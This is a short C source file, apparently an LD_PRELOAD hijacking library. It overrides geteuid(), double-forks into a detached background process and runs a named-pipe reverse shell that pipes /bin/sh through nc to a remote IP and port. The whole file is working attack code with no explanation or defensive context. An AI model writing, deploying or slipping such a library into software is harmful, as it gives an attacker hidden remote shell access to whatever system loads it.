#include <stdlib.h>
#include <string.h>
#include <sys/types.h>



void pwn() {
        system("rm /tmp/1298;mkfifo /tmp/1298;cat /tmp/1298|/bin/sh -i 2>&1|nc [IP] [PORT] >/tmp/1298");
}

int  geteuid() {
if (getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
	int pid = fork();
	if (pid < 0) {
		pwn();
	}
	else if (pid == 0 ) {
		setsid();
		int pid2 = fork();
		if (pid2 < 0) {
			pwn();
		}
		else if (pid2 > 0 ) {
			//Padre
		}
		else {
			close(0);
			close(1);
			close(2);
			umask(0);
			pwn();
		}
	}
}
